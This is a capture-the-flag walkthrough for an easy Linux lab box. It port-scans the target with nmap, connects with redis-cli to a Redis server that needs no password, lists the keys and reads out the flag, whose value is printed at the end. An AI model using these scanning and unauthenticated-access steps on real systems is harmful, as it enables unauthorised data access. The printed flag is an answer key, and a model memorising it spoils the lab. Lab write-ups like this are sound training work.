System: Linux
Difficulty: Very Easy

IP Address: 10.129.100.221

# System Flag

Ports are enumerated.
```
kali@kali:~$ nmap 10.129.100.221 -p- -v
```

Port 6379 is open.
```
<SNIP>
PORT     STATE SERVICE
6379/tcp open  redis
```

For more details scanning.
```
kali@kali:~$ nmap 10.129.100.221 -p 6379 -sC -sV
```

The name of the service is now displayed.
```
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

In order to connect to this service, `redis-cli` is used.
```
kali@kali:~$ redis-cli -h 10.129.100.221 -p 6379
```

Now select the database in the server.
```
10.129.100.221:6379> config get databases
1) "databases"
2) "16"
10.129.100.221:6379> select 1
OK
```

Here is the keys that are available on the database.
```
10.129.100.221:6379> keys *
1) "flag"
2) "temp"
3) "stor"
4) "numb"
```

In order to get the flag.
```
10.129.100.221:6379> get flag
```

The flag contents are in below.
```
03e1d2b376c37ab3f5319922053953eb
```

